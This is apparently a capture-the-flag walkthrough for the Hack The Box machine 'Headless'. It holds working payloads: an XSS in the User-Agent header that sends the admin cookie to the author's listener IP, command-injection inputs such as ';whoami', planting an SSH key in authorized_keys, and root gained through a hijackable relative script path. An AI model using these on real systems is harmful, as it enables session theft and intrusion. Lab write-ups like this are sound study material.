HTB Machine

First, enumerate the box.

```
# Nmap 7.94SVN scan initiated Sat Mar 23 15:05:10 2024 as: nmap -p- -sC -sV -oA headless -v headless.htb
Nmap scan report for headless.htb (10.129.236.174)
Host is up (0.12s latency).
Not shown: 65305 closed tcp ports (reset), 228 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
...
```

Looking at the site, we can see that it has a support page. fuzzing the directories also gives us `dashboard` as a subdirectory to visit. but later. Also worth observing, we have a cookie set called `is_admin`. decoding the cookie from base64 gets "user" in the first part, and garbage in the second part. lets assume its a hash for now.

We can see on the support page, that there is an email we can visit. if we try XSS, we can see theres a "hacking detected" page. from there, we can see that the page displays all of everything we have in the headers. so if we give an xss in our header, we can see if the admin will give us their cookies.

first, in the message, lets give the message as `<script>alert(1)</script>` to trigger the hacking detection.

then, in the user agent, lets change it to
```html
<script>fetch(`http://10.10.14.176/${document.cookie}`)</script>
```

run `updog -p 80`

```
$ updog -p 80                 
[+] Serving /home/kali/htb/machines/headless...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.80.128:80
Press CTRL+C to quit
10.129.236.174 - - [23/Mar/2024 16:12:40] "GET /is_admin=[cookie] HTTP/1.1" 302 -
```

And this gets you the admin cookie. change your cookie to the admin cookie you just got from `updog`

then go to `/dashboard`.

From here, you can do a command injection on the "Generate a website report" input field.

in burpsuite, give it `;whoami` to verify the command injection works.
```html
   <div id="output-content" style="background-color: green; color: white; padding: 10px; border-radius: 5px;">
        Systems are up and running!
		dvir
```

and then use `;cat ~/user.txt` to get user!

to get shell, you can use a reverse shell, or you can feed your public key to `~/.ssh/authorized keys` with `; echo "[your id_xxx.pub, make sure to URL encode it]" > ~/.ssh/authorized_keys`

with that out of the way, using a simple `sudo -l` will show us...
```
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

and this file is...
```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```

Seems like, if we have our own `initdb.sh` doing anything, we can get root

```bash
#!/bin/bash
cat /root/root.txt #or you can execute anything you want, like adding your key to root's authorized_keys
```

make sure to make the script executable!

and we got root!

https://www.hackthebox.com/achievement/machine/158887/594